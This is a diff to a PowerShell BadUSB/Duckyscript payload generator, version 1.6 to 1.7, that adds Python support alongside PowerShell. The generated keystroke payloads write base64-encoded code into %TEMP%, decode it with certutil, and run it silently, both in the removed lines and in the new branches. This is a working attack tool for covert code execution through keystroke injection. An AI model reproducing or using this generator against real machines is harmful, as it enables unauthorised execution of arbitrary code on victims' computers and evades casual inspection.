@@ -1,7 +1,7 @@
 # Title: REDD's Encrypted Payload Generator
 # Description: Creates a encrypted Payload for BadUSB/Duckyscript Devices.
-# AUTHOR: InfoSecREDD
-# Version: 1.6
+# AUTHOR: InfoSecREDD & dag
+# Version: 1.7
 $path = split-path -parent $MyInvocation.MyCommand.Definition
 $script = $MyInvocation.MyCommand.Name
 $payload_filename = "gen_payload.tmp"
@@ -172,9 +172,18 @@ elseif ( $AdvMode -eq 1 -And 0 -ne $delayamount) {
 else {
   "DELAY 500" | Out-File -FilePath "$payload_file" -Append
 }
-"STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output `> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
-"DELAY 1000" | Out-File -FilePath "$payload_file" -Append
-"ENTER" | Out-File -FilePath "$payload_file" -Append
+$scriptExtension = [System.IO.Path]::GetExtension($argpath).ToLower()
+if ($scriptExtension -eq ".ps1") {
+  $PShell = "STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output `> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
+  "DELAY 1000" | Out-File -FilePath "$payload_file" -Append
+  "ENTER" | Out-File -FilePath "$payload_file" -Append
+} elseif ($scriptExtension -eq ".py") {
+  $Pthon = "STRING `$TempFile = `"`$env:TEMP\temp.py`"; `$File = `"`$env:TEMP\l.py`"; echo $output `> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; python `"`$env:TEMP\l.py`"" | Out-File -FilePath "$payload_file" -Append
+  "DELAY 1000" | Out-File -FilePath "$payload_file" -Append
+  "ENTER" | Out-File -FilePath "$payload_file" -Append
+} else {
+  Write-Host "The script is neither a PowerShell (.ps1) nor a Python (.py) file."
+}
 Get-Content "$payload_file" | out-file -encoding ASCII "$final_file"
 Remove-Item "$payload_file" >$null 2>&1
 Write-Host "`nPayload Generation Complete.`n`n  Location: $final_file`n`n"
